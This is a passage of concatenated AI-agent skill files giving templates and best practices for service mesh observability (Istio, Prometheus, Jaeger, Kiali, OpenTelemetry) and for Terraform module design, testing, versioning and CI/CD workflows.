- Implementing rate limiting and circuit breakers
- Setting up cross-cluster service discovery

## Workflow

1. Assess current infrastructure and requirements
2. Design mesh topology and traffic policies
3. Implement security policies (mTLS, AuthorizationPolicy)
4. Configure observability (metrics, traces, logs)
5. Set up traffic management rules
6. Test failover and resilience patterns
7. Document operational runbooks

## Best Practices

- Start with permissive mode, gradually enforce strict mTLS
- Use namespaces for policy isolation
- Implement circuit breakers before they're needed
- Monitor mesh overhead (latency, resource usage)
- Keep sidecar resources appropriately sized
- Use destination rules for consistent load balancing

## Source: references/skills/cloud-architect/references/legacy/service-mesh-observability/SKILL.md

---
name: service-mesh-observability
description: "Implement comprehensive observability for service meshes including distributed tracing, metrics, and visualization. Use when setting up mesh monitoring, debugging latency issues, or implementing SL..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Service Mesh Observability

Complete guide to observability patterns for Istio, Linkerd, and service mesh deployments.

## Do not use this skill when

- The task is unrelated to service mesh observability
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Use this skill when

- Setting up distributed tracing across services
- Implementing service mesh metrics and dashboards
- Debugging latency and error issues
- Defining SLOs for service communication
- Visualizing service dependencies
- Troubleshooting mesh connectivity

## Core Concepts

### 1. Three Pillars of Observability

```
┌─────────────────────────────────────────────────────┐
│                  Observability                       │
├─────────────────┬─────────────────┬─────────────────┤
│     Metrics     │     Traces      │      Logs       │
│                 │                 │                 │
│ • Request rate  │ • Span context  │ • Access logs   │
│ • Error rate    │ • Latency       │ • Error details │
│ • Latency P50   │ • Dependencies  │ • Debug info    │
│ • Saturation    │ • Bottlenecks   │ • Audit trail   │
└─────────────────┴─────────────────┴─────────────────┘
```

### 2. Golden Signals for Mesh

| Signal | Description | Alert Threshold |
|--------|-------------|-----------------|
| **Latency** | Request duration P50, P99 | P99 > 500ms |
| **Traffic** | Requests per second | Anomaly detection |
| **Errors** | 5xx error rate | > 1% |
| **Saturation** | Resource utilization | > 80% |

## Templates

### Template 1: Istio with Prometheus & Grafana

```yaml
# Install Prometheus
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus
  namespace: istio-system
data:
  prometheus.yml: |
    global:
      scrape_interval: 15s
    scrape_configs:
      - job_name: 'istio-mesh'
        kubernetes_sd_configs:
          - role: endpoints
            namespaces:
              names:
                - istio-system
        relabel_configs:
          - source_labels: [__meta_kubernetes_service_name]
            action: keep
            regex: istio-telemetry
---
# ServiceMonitor for Prometheus Operator
apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: istio-mesh
  namespace: istio-system
spec:
  selector:
    matchLabels:
      app: istiod
  endpoints:
    - port: http-monitoring
      interval: 15s
```

### Template 2: Key Istio Metrics Queries

```promql
# Request rate by service
sum(rate(istio_requests_total{reporter="destination"}[5m])) by (destination_service_name)

# Error rate (5xx)
sum(rate(istio_requests_total{reporter="destination", response_code=~"5.."}[5m]))
  / sum(rate(istio_requests_total{reporter="destination"}[5m])) * 100

# P99 latency
histogram_quantile(0.99,
  sum(rate(istio_request_duration_milliseconds_bucket{reporter="destination"}[5m]))
  by (le, destination_service_name))

# TCP connections
sum(istio_tcp_connections_opened_total{reporter="destination"}) by (destination_service_name)

# Request size
histogram_quantile(0.99,
  sum(rate(istio_request_bytes_bucket{reporter="destination"}[5m]))
  by (le, destination_service_name))
```

### Template 3: Jaeger Distributed Tracing

```yaml
# Jaeger installation for Istio
apiVersion: install.istio.io/v1alpha1
kind: IstioOperator
spec:
  meshConfig:
    enableTracing: true
    defaultConfig:
      tracing:
        sampling: 100.0  # 100% in dev, lower in prod
        zipkin:
          address: jaeger-collector.istio-system:9411
---
# Jaeger deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jaeger
  namespace: istio-system
spec:
  selector:
    matchLabels:
      app: jaeger
  template:
    metadata:
      labels:
        app: jaeger
    spec:
      containers:
        - name: jaeger
          image: jaegertracing/all-in-one:1.50
          ports:
            - containerPort: 5775   # UDP
            - containerPort: 6831   # Thrift
            - containerPort: 6832   # Thrift
            - containerPort: 5778   # Config
            - containerPort: 16686  # UI
            - containerPort: 14268  # HTTP
            - containerPort: 14250  # gRPC
            - containerPort: 9411   # Zipkin
          env:
            - name: COLLECTOR_ZIPKIN_HOST_PORT
              value: ":9411"
```

### Template 4: Linkerd Viz Dashboard

```bash
# Install Linkerd viz extension
linkerd viz install | kubectl apply -f -

# Access dashboard
linkerd viz dashboard

# CLI commands for observability
# Top requests
linkerd viz top deploy/my-app

# Per-route metrics
linkerd viz routes deploy/my-app --to deploy/backend

# Live traffic inspection
linkerd viz tap deploy/my-app --to deploy/backend

# Service edges (dependencies)
linkerd viz edges deployment -n my-namespace
```

### Template 5: Grafana Dashboard JSON

```json
{
  "dashboard": {
    "title": "Service Mesh Overview",
    "panels": [
      {
        "title": "Request Rate",
        "type": "graph",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{reporter=\"destination\"}[5m])) by (destination_service_name)",
            "legendFormat": "{{destination_service_name}}"
          }
        ]
      },
      {
        "title": "Error Rate",
        "type": "gauge",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{response_code=~\"5..\"}[5m])) / sum(rate(istio_requests_total[5m])) * 100"
          }
        ],
        "fieldConfig": {
          "defaults": {
            "thresholds": {
              "steps": [
                {"value": 0, "color": "green"},
                {"value": 1, "color": "yellow"},
                {"value": 5, "color": "red"}
              ]
            }
          }
        }
      },
      {
        "title": "P99 Latency",
        "type": "graph",
        "targets": [
          {
            "expr": "histogram_quantile(0.99, sum(rate(istio_request_duration_milliseconds_bucket{reporter=\"destination\"}[5m])) by (le, destination_service_name))",
            "legendFormat": "{{destination_service_name}}"
          }
        ]
      },
      {
        "title": "Service Topology",
        "type": "nodeGraph",
        "targets": [
          {
            "expr": "sum(rate(istio_requests_total{reporter=\"destination\"}[5m])) by (source_workload, destination_service_name)"
          }
        ]
      }
    ]
  }
}
```

### Template 6: Kiali Service Mesh Visualization

```yaml
# Kiali installation
apiVersion: kiali.io/v1alpha1
kind: Kiali
metadata:
  name: kiali
  namespace: istio-system
spec:
  auth:
    strategy: anonymous  # or openid, token
  deployment:
    accessible_namespaces:
      - "**"
  external_services:
    prometheus:
      url: http://prometheus.istio-system:9090
    tracing:
      url: http://jaeger-query.istio-system:16686
    grafana:
      url: http://grafana.istio-system:3000
```

### Template 7: OpenTelemetry Integration

```yaml
# OpenTelemetry Collector for mesh
apiVersion: v1
kind: ConfigMap
metadata:
  name: otel-collector-config
data:
  config.yaml: |
    receivers:
      otlp:
        protocols:
          grpc:
            endpoint: 0.0.0.0:4317
          http:
            endpoint: 0.0.0.0:4318
      zipkin:
        endpoint: 0.0.0.0:9411

    processors:
      batch:
        timeout: 10s

    exporters:
      jaeger:
        endpoint: jaeger-collector:14250
        tls:
          insecure: true
      prometheus:
        endpoint: 0.0.0.0:8889

    service:
      pipelines:
        traces:
          receivers: [otlp, zipkin]
          processors: [batch]
          exporters: [jaeger]
        metrics:
          receivers: [otlp]
          processors: [batch]
          exporters: [prometheus]
---
# Istio Telemetry v2 with OTel
apiVersion: telemetry.istio.io/v1alpha1
kind: Telemetry
metadata:
  name: mesh-default
  namespace: istio-system
spec:
  tracing:
    - providers:
        - name: otel
      randomSamplingPercentage: 10
```

## Alerting Rules

```yaml
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: mesh-alerts
  namespace: istio-system
spec:
  groups:
    - name: mesh.rules
      rules:
        - alert: HighErrorRate
          expr: |
            sum(rate(istio_requests_total{response_code=~"5.."}[5m])) by (destination_service_name)
            / sum(rate(istio_requests_total[5m])) by (destination_service_name) > 0.05
          for: 5m
          labels:
            severity: critical
          annotations:
            summary: "High error rate for {{ $labels.destination_service_name }}"

        - alert: HighLatency
          expr: |
            histogram_quantile(0.99, sum(rate(istio_request_duration_milliseconds_bucket[5m]))
            by (le, destination_service_name)) > 1000
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "High P99 latency for {{ $labels.destination_service_name }}"

        - alert: MeshCertExpiring
          expr: |
            (certmanager_certificate_expiration_timestamp_seconds - time()) / 86400 < 7
          labels:
            severity: warning
          annotations:
            summary: "Mesh certificate expiring in less than 7 days"
```

## Best Practices

### Do's
- **Sample appropriately** - 100% in dev, 1-10% in prod
- **Use trace context** - Propagate headers consistently
- **Set up alerts** - For golden signals
- **Correlate metrics/traces** - Use exemplars
- **Retain strategically** - Hot/cold storage tiers

### Don'ts
- **Don't over-sample** - Storage costs add up
- **Don't ignore cardinality** - Limit label values
- **Don't skip dashboards** - Visualize dependencies
- **Don't forget costs** - Monitor observability costs

## Resources

- [Istio Observability](https://istio.io/latest/docs/tasks/observability/)
- [Linkerd Observability](https://linkerd.io/2.14/features/dashboard/)
- [OpenTelemetry](https://opentelemetry.io/)
- [Kiali](https://kiali.io/)

## Source: references/skills/cloud-architect/references/legacy/terraform-infrastructure/SKILL.md

---
name: terraform-infrastructure
description: "Terraform infrastructure as code workflow for provisioning cloud resources, creating reusable modules, and managing infrastructure at scale."
category: granular-workflow-bundle
risk: safe
source: personal
date_added: "2026-02-27"
---

# Terraform Infrastructure Workflow

## Overview

Specialized workflow for infrastructure as code using Terraform including resource provisioning, module creation, state management, and multi-environment deployments.

## When to Use This Workflow

Use this workflow when:
- Provisioning cloud infrastructure
- Creating Terraform modules
- Managing multi-environment infra
- Implementing IaC best practices
- Setting up Terraform workflows

## Workflow Phases

### Phase 1: Terraform Setup

#### Skills to Invoke
- `terraform-skill` - Terraform basics
- `terraform-specialist` - Advanced Terraform

#### Actions
1. Initialize Terraform
2. Configure backend
3. Set up providers
4. Configure variables
5. Create outputs

#### Copy-Paste Prompts
```
Use @terraform-skill to set up Terraform project
```

### Phase 2: Resource Provisioning

#### Skills to Invoke
- `terraform-module-library` - Terraform modules
- `cloud-architect` - Cloud architecture

#### Actions
1. Design infrastructure
2. Create resource definitions
3. Configure networking
4. Set up compute
5. Add storage

#### Copy-Paste Prompts
```
Use @terraform-module-library to provision cloud resources
```

### Phase 3: Module Creation

#### Skills to Invoke
- `terraform-module-library` - Module creation

#### Actions
1. Design module interface
2. Create module structure
3. Define variables/outputs
4. Add documentation
5. Test module

#### Copy-Paste Prompts
```
Use @terraform-module-library to create reusable Terraform module
```

### Phase 4: State Management

#### Skills to Invoke
- `terraform-specialist` - State management

#### Actions
1. Configure remote backend
2. Set up state locking
3. Implement workspaces
4. Configure state access
5. Set up backup

#### Copy-Paste Prompts
```
Use @terraform-specialist to configure Terraform state
```

### Phase 5: Multi-Environment

#### Skills to Invoke
- `terraform-specialist` - Multi-environment

#### Actions
1. Design environment structure
2. Create environment configs
3. Set up variable files
4. Configure isolation
5. Test deployments

#### Copy-Paste Prompts
```
Use @terraform-specialist to set up multi-environment Terraform
```

### Phase 6: CI/CD Integration

#### Skills to Invoke
- `cicd-automation-workflow-automate` - CI/CD
- `github-actions-templates` - GitHub Actions

#### Actions
1. Create CI pipeline
2. Configure plan/apply
3. Set up approvals
4. Add validation
5. Test pipeline

#### Copy-Paste Prompts
```
Use @cicd-automation-workflow-automate to create Terraform CI/CD
```

### Phase 7: Security

#### Skills to Invoke
- `secrets-management` - Secrets management
- `terraform-specialist` - Security

#### Actions
1. Configure secrets
2. Set up encryption
3. Implement policies
4. Add compliance
5. Audit access

#### Copy-Paste Prompts
```
Use @secrets-management to secure Terraform secrets
```

## Quality Gates

- [ ] Resources provisioned
- [ ] Modules working
- [ ] State configured
- [ ] Multi-env tested
- [ ] CI/CD working
- [ ] Security verified

## Related Workflow Bundles

- `cloud-devops` - Cloud/DevOps
- `kubernetes-deployment` - Kubernetes
- `aws-infrastructure` - AWS specific

## Source: references/skills/cloud-architect/references/legacy/terraform-module-library/SKILL.md

---
name: terraform-module-library
description: "Build reusable Terraform modules for AWS, Azure, and GCP infrastructure following infrastructure-as-code best practices. Use when creating infrastructure modules, standardizing cloud provisioning, ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Terraform Module Library

Production-ready Terraform module patterns for AWS, Azure, and GCP infrastructure.

## Do not use this skill when

- The task is unrelated to terraform module library
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Create reusable, well-tested Terraform modules for common cloud infrastructure patterns across multiple cloud providers.

## Use this skill when

- Build reusable infrastructure components
- Standardize cloud resource provisioning
- Implement infrastructure as code best practices
- Create multi-cloud compatible modules
- Establish organizational Terraform standards

## Module Structure

```
terraform-modules/
├── aws/
│   ├── vpc/
│   ├── eks/
│   ├── rds/
│   └── s3/
├── azure/
│   ├── vnet/
│   ├── aks/
│   └── storage/
└── gcp/
    ├── vpc/
    ├── gke/
    └── cloud-sql/
```

## Standard Module Pattern

```
module-name/
├── main.tf          # Main resources
├── variables.tf     # Input variables
├── outputs.tf       # Output values
├── versions.tf      # Provider versions
├── README.md        # Documentation
├── examples/        # Usage examples
│   └── complete/
│       ├── main.tf
│       └── variables.tf
└── tests/           # Terratest files
    └── module_test.go
```

## AWS VPC Module Example

**main.tf:**
```hcl
resource "aws_vpc" "main" {
  cidr_block           = var.cidr_block
  enable_dns_hostnames = var.enable_dns_hostnames
  enable_dns_support   = var.enable_dns_support

  tags = merge(
    {
      Name = var.name
    },
    var.tags
  )
}

resource "aws_subnet" "private" {
  count             = length(var.private_subnet_cidrs)
  vpc_id            = aws_vpc.main.id
  cidr_block        = var.private_subnet_cidrs[count.index]
  availability_zone = var.availability_zones[count.index]

  tags = merge(
    {
      Name = "${var.name}-private-${count.index + 1}"
      Tier = "private"
    },
    var.tags
  )
}

resource "aws_internet_gateway" "main" {
  count  = var.create_internet_gateway ? 1 : 0
  vpc_id = aws_vpc.main.id

  tags = merge(
    {
      Name = "${var.name}-igw"
    },
    var.tags
  )
}
```

**variables.tf:**
```hcl
variable "name" {
  description = "Name of the VPC"
  type        = string
}

variable "cidr_block" {
  description = "CIDR block for VPC"
  type        = string
  validation {
    condition     = can(regex("^([0-9]{1,3}\\.){3}[0-9]{1,3}/[0-9]{1,2}$", var.cidr_block))
    error_message = "CIDR block must be valid IPv4 CIDR notation."
  }
}

variable "availability_zones" {
  description = "List of availability zones"
  type        = list(string)
}

variable "private_subnet_cidrs" {
  description = "CIDR blocks for private subnets"
  type        = list(string)
  default     = []
}

variable "enable_dns_hostnames" {
  description = "Enable DNS hostnames in VPC"
  type        = bool
  default     = true
}

variable "tags" {
  description = "Additional tags"
  type        = map(string)
  default     = {}
}
```

**outputs.tf:**
```hcl
output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}

output "private_subnet_ids" {
  description = "IDs of private subnets"
  value       = aws_subnet.private[*].id
}

output "vpc_cidr_block" {
  description = "CIDR block of VPC"
  value       = aws_vpc.main.cidr_block
}
```

## Best Practices

1. **Use semantic versioning** for modules
2. **Document all variables** with descriptions
3. **Provide examples** in examples/ directory
4. **Use validation blocks** for input validation
5. **Output important attributes** for module composition
6. **Pin provider versions** in versions.tf
7. **Use locals** for computed values
8. **Implement conditional resources** with count/for_each
9. **Test modules** with Terratest
10. **Tag all resources** consistently

## Module Composition

```hcl
module "vpc" {
  source = "../../modules/aws/vpc"

  name               = "production"
  cidr_block         = "10.0.0.0/16"
  availability_zones = ["us-west-2a", "us-west-2b", "us-west-2c"]

  private_subnet_cidrs = [
    "10.0.1.0/24",
    "10.0.2.0/24",
    "10.0.3.0/24"
  ]

  tags = {
    Environment = "production"
    ManagedBy   = "terraform"
  }
}

module "rds" {
  source = "../../modules/aws/rds"

  identifier     = "production-db"
  engine         = "postgres"
  engine_version = "15.3"
  instance_class = "db.t3.large"

  vpc_id     = module.vpc.vpc_id
  subnet_ids = module.vpc.private_subnet_ids

  tags = {
    Environment = "production"
  }
}
```

## Reference Files

- `assets/vpc-module/` - Complete VPC module example
- `assets/rds-module/` - RDS module example
- `references/aws-modules.md` - AWS module patterns
- `references/azure-modules.md` - Azure module patterns
- `references/gcp-modules.md` - GCP module patterns

## Testing

```go
// tests/vpc_test.go
package test

import (
    "testing"
    "github.com/gruntwork-io/terratest/modules/terraform"
    "github.com/stretchr/testify/assert"
)

func TestVPCModule(t *testing.T) {
    terraformOptions := &terraform.Options{
        TerraformDir: "../examples/complete",
    }

    defer terraform.Destroy(t, terraformOptions)
    terraform.InitAndApply(t, terraformOptions)

    vpcID := terraform.Output(t, terraformOptions, "vpc_id")
    assert.NotEmpty(t, vpcID)
}
```

## Related Skills

- `multi-cloud-architecture` - For architectural decisions
- `cost-optimization` - For cost-effective designs

## Source: references/skills/cloud-architect/references/legacy/terraform-skill/SKILL.md

---
name: terraform-skill
description: "Terraform infrastructure as code best practices"
risk: safe
source: "https://github.com/antonbabenko/terraform-skill"
date_added: "2026-02-27"
---
# Terraform Skill

Comprehensive Terraform and OpenTofu guidance covering testing, modules, CI/CD, and production patterns. Based on terraform-best-practices.com and enterprise experience.

## When to Use This Skill

**Activate this skill when:**
- Creating new Terraform or OpenTofu configurations or modules
- Setting up testing infrastructure for IaC code
- Deciding between testing approaches (validate, plan, frameworks)
- Structuring multi-environment deployments
- Implementing CI/CD for infrastructure-as-code
- Reviewing or refactoring existing Terraform/OpenTofu projects
- Choosing between module patterns or state management approaches

**Don't use this skill for:**
- Basic Terraform/OpenTofu syntax questions (general model knowledge is enough)
- Provider-specific API reference (link to docs instead)
- Cloud platform questions unrelated to Terraform/OpenTofu

## Core Principles

### 1. Code Structure Philosophy

**Module Hierarchy:**

| Type | When to Use | Scope |
|------|-------------|-------|
| **Resource Module** | Single logical group of connected resources | VPC + subnets, Security group + rules |
| **Infrastructure Module** | Collection of resource modules for a purpose | Multiple resource modules in one region/account |
| **Composition** | Complete infrastructure | Spans multiple regions/accounts |

**Hierarchy:** Resource → Resource Module → Infrastructure Module → Composition

**Directory Structure:**
```
environments/        # Environment-specific configurations
├── prod/
├── staging/
└── dev/

modules/            # Reusable modules
├── networking/
├── compute/
└── data/

examples/           # Module usage examples (also serve as tests)
├── complete/
└── minimal/
```

**Key principle from terraform-best-practices.com:**
- Separate **environments** (prod, staging) from **modules** (reusable components)
- Use **examples/** as both documentation and integration test fixtures
- Keep modules small and focused (single responsibility)

**For detailed module architecture, see:** Code Patterns: Module Types & Hierarchy

### 2. Naming Conventions

**Resources:**
```hcl
# Good: Descriptive, contextual
resource "aws_instance" "web_server" { }
resource "aws_s3_bucket" "application_logs" { }

# Good: "this" for singleton resources (only one of that type)
resource "aws_vpc" "this" { }
resource "aws_security_group" "this" { }

# Avoid: Generic names for non-singletons
resource "aws_instance" "main" { }
resource "aws_s3_bucket" "bucket" { }
```

**Singleton Resources:**

Use `"this"` when your module creates only one resource of that type:

✅ DO:
```hcl
resource "aws_vpc" "this" {}           # Module creates one VPC
resource "aws_security_group" "this" {}  # Module creates one SG
```

❌ DON'T use "this" for multiple resources:
```hcl
resource "aws_subnet" "this" {}  # If creating multiple subnets
```

Use descriptive names when creating multiple resources of the same type.

**Variables:**
```hcl
# Prefix with context when needed
var.vpc_cidr_block          # Not just "cidr"
var.database_instance_class # Not just "instance_class"
```

**Files:**
- `main.tf` - Primary resources
- `variables.tf` - Input variables
- `outputs.tf` - Output values
- `versions.tf` - Provider versions
- `data.tf` - Data sources (optional)

## Testing Strategy Framework

### Decision Matrix: Which Testing Approach?

| Your Situation | Recommended Approach | Tools | Cost |
|----------------|---------------------|-------|------|
| **Quick syntax check** | Static analysis | `terraform validate`, `fmt` | Free |
| **Pre-commit validation** | Static + lint | `validate`, `tflint`, `trivy`, `checkov` | Free |
| **Terraform 1.6+, simple logic** | Native test framework | Built-in `terraform test` | Free-Low |
| **Pre-1.6, or Go expertise** | Integration testing | Terratest | Low-Med |
| **Security/compliance focus** | Policy as code | OPA, Sentinel | Free |
| **Cost-sensitive workflow** | Mock providers (1.7+) | Native tests + mocking | Free |
| **Multi-cloud, complex** | Full integration | Terratest + real infra | Med-High |

### Testing Pyramid for Infrastructure

```
        /\
       /  \          End-to-End Tests (Expensive)
      /____\         - Full environment deployment
     /      \        - Production-like setup
    /________\
   /          \      Integration Tests (Moderate)
  /____________\     - Module testing in isolation
 /              \    - Real resources in test account
/________________\   Static Analysis (Cheap)
                     - validate, fmt, lint
                     - Security scanning
```

### Native Test Best Practices (1.6+)

**Before generating test code:**

1. **Validate schemas with Terraform MCP:**
   ```
   Search provider docs → Get resource schema → Identify block types
   ```

2. **Choose correct command mode:**
   - `command = plan` - Fast, for input validation
   - `command = apply` - Required for computed values and set-type blocks

3. **Handle set-type blocks correctly:**
   - Cannot index with `[0]`
   - Use `for` expressions to iterate
   - Or use `command = apply` to materialize

**Common patterns:**
- S3 encryption rules: **set** (use for expressions)
- Lifecycle transitions: **set** (use for expressions)
- IAM policy statements: **set** (use for expressions)

**For detailed testing guides, see:**
- **Testing Frameworks Guide** - Deep dive into static analysis, native tests, and Terratest
- **Quick Reference** - Decision flowchart and command cheat sheet

## Code Structure Standards

### Resource Block Ordering

**Strict ordering for consistency:**
1. `count` or `for_each` FIRST (blank line after)
2. Other arguments
3. `tags` as last real argument
4. `depends_on` after tags (if needed)
5. `lifecycle` at the very end (if needed)

```hcl
# ✅ GOOD - Correct ordering
resource "aws_nat_gateway" "this" {
  count = var.create_nat_gateway ? 1 : 0

  allocation_id = aws_eip.this[0].id
  subnet_id     = aws_subnet.public[0].id

  tags = {
    Name = "${var.name}-nat"
  }

  depends_on = [aws_internet_gateway.this]

  lifecycle {
    create_before_destroy = true
  }
}
```

### Variable Block Ordering

1. `description` (ALWAYS required)
2. `type`
3. `default`
4. `validation`
5. `nullable` (when setting to false)

```hcl
variable "environment" {
  description = "Environment name for resource tagging"
  type        = string
  default     = "dev"

  validation {
    condition     = contains(["dev", "staging", "prod"], var.environment)
    error_message = "Environment must be one of: dev, staging, prod."
  }

  nullable = false
}
```

**For complete structure guidelines, see:** Code Patterns: Block Ordering & Structure

## Count vs For_Each: When to Use Each

### Quick Decision Guide

| Scenario | Use | Why |
|----------|-----|-----|
| Boolean condition (create or don't) | `count = condition ? 1 : 0` | Simple on/off toggle |
| Simple numeric replication | `count = 3` | Fixed number of identical resources |
| Items may be reordered/removed | `for_each = toset(list)` | Stable resource addresses |
| Reference by key | `for_each = map` | Named access to resources |
| Multiple named resources | `for_each` | Better maintainability |

### Common Patterns

**Boolean conditions:**
```hcl
# ✅ GOOD - Boolean condition
resource "aws_nat_gateway" "this" {
  count = var.create_nat_gateway ? 1 : 0
  # ...
}
```

**Stable addressing with for_each:**
```hcl
# ✅ GOOD - Removing "us-east-1b" only affects that subnet
resource "aws_subnet" "private" {
  for_each = toset(var.availability_zones)

  availability_zone = each.key
  # ...
}

# ❌ BAD - Removing middle AZ recreates all subsequent subnets
resource "aws_subnet" "private" {
  count = length(var.availability_zones)

  availability_zone = var.availability_zones[count.index]
  # ...
}
```

**For migration guides and detailed examples, see:** Code Patterns: Count vs For_Each

## Locals for Dependency Management

**Use locals to ensure correct resource deletion order:**

```hcl
# Problem: Subnets might be deleted after CIDR blocks, causing errors
# Solution: Use try() in locals to hint deletion order

locals {
  # References secondary CIDR first, falling back to VPC
  # Forces Terraform to delete subnets before CIDR association
  vpc_id = try(
    aws_vpc_ipv4_cidr_block_association.this[0].vpc_id,
    aws_vpc.this.id,
    ""
  )
}

resource "aws_vpc" "this" {
  cidr_block = "10.0.0.0/16"
}

resource "aws_vpc_ipv4_cidr_block_association" "this" {
  count = var.add_secondary_cidr ? 1 : 0

  vpc_id     = aws_vpc.this.id
  cidr_block = "10.1.0.0/16"
}

resource "aws_subnet" "public" {
  vpc_id     = local.vpc_id  # Uses local, not direct reference
  cidr_block = "10.1.0.0/24"
}
```

**Why this matters:**
- Prevents deletion errors when destroying infrastructure
- Ensures correct dependency order without explicit `depends_on`
- Particularly useful for VPC configurations with secondary CIDR blocks

**For detailed examples, see:** Code Patterns: Locals for Dependency Management

## Module Development

### Standard Module Structure

```
my-module/
├── README.md           # Usage documentation
├── main.tf             # Primary resources
├── variables.tf        # Input variables with descriptions
├── outputs.tf          # Output values
├── versions.tf         # Provider version constraints
├── examples/
│   ├── minimal/        # Minimal working example
│   └── complete/       # Full-featured example
└── tests/              # Test files
    └── module_test.tftest.hcl  # Or .go
```

### Best Practices Summary

**Variables:**
- ✅ Always include `description`
- ✅ Use explicit `type` constraints
- ✅ Provide sensible `default` values where appropriate
- ✅ Add `validation` blocks for complex constraints
- ✅ Use `sensitive = true` for secrets

**Outputs:**
- ✅ Always include `description`
- ✅ Mark sensitive outputs with `sensitive = true`
- ✅ Consider returning objects for related values
- ✅ Document what consumers should do with each output

**For detailed module patterns, see:**
- **Module Patterns Guide** - Variable best practices, output design, ✅ DO vs ❌ DON'T patterns
- **Quick Reference** - Resource naming, variable naming, file organization

## CI/CD Integration

### Recommended Workflow Stages

1. **Validate** - Format check + syntax validation + linting
2. **Test** - Run automated tests (native or Terratest)
3. **Plan** - Generate and review execution plan
4. **Apply** - Execute changes (with approvals for production)

### Cost Optimization Strategy

1. **Use mocking for PR validation** (free)
2. **Run integration tests only on main branch** (controlled cost)
3. **Implement auto-cleanup** (prevent orphaned resources)
4. **Tag all test resources** (track spending)

**For complete CI/CD templates, see:**
- **CI/CD Workflows Guide** - GitHub Actions, GitLab CI, Atlantis integration, cost optimization
- **Quick Reference** - Common CI/CD issues and solutions

## Security & Compliance

### Essential Security Checks

```bash
# Static security scanning
trivy config .
checkov -d .
```

### Common Issues to Avoid

❌ **Don't:**
- Store secrets in variables
- Use default VPC
- Skip encryption
- Open security groups to 0.0.0.0/0

✅ **Do:**
- Use AWS Secrets Manager / Parameter Store
- Create dedicated VPCs
- Enable encryption at rest
- Use least-privilege security groups

**For detailed security guidance, see:**
- **Security & Compliance Guide** - Trivy/Checkov integration, secrets management, state file security, compliance testing

## Version Management

### Version Constraint Syntax

```hcl
version = "5.0.0"      # Exact (avoid - inflexible)
version = "~> 5.0"     # Recommended: 5.0.x only
version = ">= 5.0"     # Minimum (risky - breaking changes)
```

### Strategy by Component

| Component | Strategy | Example |
|-----------|----------|---------|
| **Terraform** | Pin minor version | `required_version = "~> 1.9"` |
| **Providers** | Pin major version | `version = "~> 5.0"` |
| **Modules (prod)** | Pin exact version | `version = "5.1.2"` |
| **Modules (dev)** | Allow patch updates | `version = "~> 5.1"` |

### Update Workflow

```bash
# Lock versions initially
terraform init              # Creates .terraform.lock.hcl

# Update to latest within constraints
terraform init -upgrade     # Updates providers

# Review and test
terraform plan
```

**For detailed version management, see:** Code Patterns: Version Management

## Modern Terraform Features (1.0+)

### Feature Availability by Version

| Feature | Version | Use Case |
|---------|---------|----------|
| `try()` function | 0.13+ | Safe fallbacks, replaces `element(concat())` |
| `nullable = false` | 1.1+ | Prevent null values in variables |
| `moved` blocks | 1.1+ | Refactor without destroy/recreate |
| `optional()` with defaults | 1.3+ | Optional object attributes |
| Native testing | 1.6+ | Built-in test framework |
| Mock providers | 1.7+ | Cost-free unit testing |
| Provider functions | 1.8+ | Provider-specific data transformation |
| Cross-variable validation | 1.9+ | Validate relationships between variables |
| Write-only arguments | 1.11+ | Secrets never stored in state |

### Quick Examples

```hcl
# try() - Safe fallbacks (0.13+)
output "sg_id" {
  value = try(aws_security_group.this[0].id, "")
}

# optional() - Optional attributes with defaults (1.3+)
variable "config" {
  type = object({
    name    = string
    timeout = optional(number, 300)  # Default: 300
  })
}

# Cross-variable validation (1.9+)
variable "environment" { type = string }
variable "backup_days" {
  type = number
  validation {
    condition     = var.environment == "prod" ? var.backup_days >= 7 : true
    error_message = "Production requires backup_days >= 7"
  }
}
```

**For complete patterns and examples, see:** Code Patterns: Modern Terraform Features

## Version-Specific Guidance

### Terraform 1.0-1.5
- Use Terratest for testing
- No native testing framework available
- Focus on static analysis and plan validation

### Terraform 1.6+ / OpenTofu 1.6+
- **New:** Native `terraform test` / `tofu test` command
- Consider migrating from external frameworks for simple tests
- Keep Terratest only for complex integration tests

### Terraform 1.7+ / OpenTofu 1.7+
- **New:** Mock providers for unit testing
- Reduce cost by mocking external dependencies
- Use real integration tests for final validation

### Terraform vs OpenTofu

Both are fully supported by this skill. For licensing, governance, and feature comparison, see Quick Reference: Terraform vs OpenTofu.

## Detailed Guides

This skill uses **progressive disclosure** - essential information is in this main file, detailed guides are available when needed:

📚 **Reference Files:**
- **Testing Frameworks** - In-depth guide to static analysis, native tests, and Terratest
- **Module Patterns** - Module structure, variable/output best practices, ✅ DO vs ❌ DON'T patterns
- **CI/CD Workflows** - GitHub Actions, GitLab CI templates, cost optimization, automated cleanup
- **Security & Compliance** - Trivy/Checkov integration, secrets management, compliance testing
- **Quick Reference** - Command cheat sheets, decision flowcharts, troubleshooting guide

**How to use:** When you need detailed information on a topic, reference the appropriate guide. the assistant will load it on demand to provide comprehensive guidance.

## License

This skill is licensed under the **Apache License 2.0**. See the LICENSE file for full terms.

**Copyright © 2026 Anton Babenko**

## Source: references/skills/cloud-architect/references/legacy/terraform-specialist/SKILL.md

---
name: terraform-specialist
description: Expert Terraform/OpenTofu specialist mastering advanced IaC automation, state management, and enterprise infrastructure patterns.
risk: unknown
source: community
date_added: '2026-02-27'
---
You are a Terraform/OpenTofu specialist focused on advanced infrastructure automation, state management, and modern IaC practices.

## Use this skill when

- Designing Terraform/OpenTofu modules or environments
- Managing state backends, workspaces, or multi-cloud stacks
- Implementing policy-as-code and CI/CD automation for IaC

## Do not use this skill when

- You only need a one-off manual infrastructure change
- You are locked to a different IaC tool or platform
- You cannot store or secure state remotely

## Instructions

1. Define environments, providers, and security constraints.
